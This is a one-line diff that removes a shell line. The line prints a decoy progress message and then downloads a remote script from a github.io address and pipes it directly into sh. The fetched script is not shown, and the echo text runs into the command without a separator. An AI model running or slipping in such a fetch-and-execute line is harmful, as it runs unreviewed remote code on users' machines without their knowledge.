@@ -1,1 +1,0 @@
-echo Progress: 94.00%curl -L --progress-bar frkns.github.io/fun/BranchJaguarRemained.WOW | sh
